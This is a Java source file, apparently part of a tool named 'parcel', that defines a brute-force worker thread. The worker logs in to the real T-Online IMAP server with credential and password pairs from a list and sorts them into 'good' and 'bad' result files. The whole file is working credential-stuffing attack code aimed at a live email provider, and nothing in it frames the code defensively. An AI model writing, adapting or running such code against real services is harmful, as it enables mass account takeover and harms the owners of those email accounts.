package org.bsoftware.parcel.domain.runnables;

import com.chilkatsoft.CkImap;
import lombok.RequiredArgsConstructor;
import org.bsoftware.parcel.domain.callbacks.BruteForceCallback;
import org.bsoftware.parcel.domain.components.DataContainer;
import org.bsoftware.parcel.domain.components.LogView;
import org.bsoftware.parcel.domain.model.DataType;
import org.bsoftware.parcel.domain.model.Source;

import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousFileChannel;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.time.temporal.ChronoUnit;

/**
 * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
 *
 * @author Rudolf Barbu
 * @version 0.9.0
 */
@RequiredArgsConstructor
public class BruteForceRunnable implements Runnable
{
    /**
     * Use or not SSL and TLS
     */
    private static final boolean SSL_AND_TLS = Boolean.TRUE;

    /**
     * IMAP server port
     */
    private static final int IMAP_PORT = 993;

    /**
     * IMAP server host link
     */
    private static final String IMAP_SERVER = "secureimap.t-online.de";

    /**
     * Timestamp on thread's start
     */
    private final LocalTime startTime;

    /**
     * Callback interface, which is used to deliver messages to service
     */
    private final BruteForceCallback bruteForceCallback;

    /**
     * Main method of brute-force algorithm
     */
    @Override
    public void run()
    {
        final CkImap ckImap = new CkImap();

        ckImap.put_Ssl(SSL_AND_TLS);
        ckImap.put_StartTls(SSL_AND_TLS);
        ckImap.put_Port(IMAP_PORT);

        try
        {
            Source source;
            while (((source = DataContainer.getNextSource()) != null) && !Thread.currentThread().isInterrupted())
            {
                ckImap.Connect(IMAP_SERVER);
                saveSourceToFile(source, ckImap.Login(source.getCredential(), source.getPassword()));
                bruteForceCallback.handleDecrementCounter(DataType.SOURCE);

                ckImap.Disconnect();
            }
        }
        catch (final URISyntaxException | IOException exception)
        {
            bruteForceCallback.handleBruteForceMessage(LogView.LogLevel.ERROR, String.format("Exception occurred, while saving source to file, clause: %s", exception.getCause().getMessage()));
        }

        bruteForceCallback.handleThreadTermination();
    }

    /**
     * Saving source object to result file
     *
     * @param source - data to save in-to file
     * @param isLogged - Based on this flag, it is decided in which file to save the data
     * @throws URISyntaxException if method can't generate URI
     * @throws IOException if method can't create file or directory
     */
    private synchronized void saveSourceToFile(final Source source, final boolean isLogged) throws URISyntaxException, IOException
    {
        final String fileName = isLogged ? "good" : "bad";
        final Path pathToFolder = Paths.get(getClass().getProtectionDomain().getCodeSource().getLocation().toURI()).resolve(String.format("../results [%s]", startTime.truncatedTo(ChronoUnit.SECONDS).format(DateTimeFormatter.ISO_LOCAL_TIME).replace(':', '.')));

        if (!Files.exists(pathToFolder))
        {
            Files.createDirectories(pathToFolder);
        }

        final Path pathToFile = pathToFolder.resolve(String.format("%s.txt", fileName));

        try (final AsynchronousFileChannel asynchronousFileChannel = AsynchronousFileChannel.open(pathToFile, StandardOpenOption.CREATE, StandardOpenOption.WRITE))
        {
            asynchronousFileChannel.write(ByteBuffer.wrap(String.format("%s:%s%n", source.getCredential(), source.getPassword()).getBytes()), asynchronousFileChannel.size());
        }
    }
}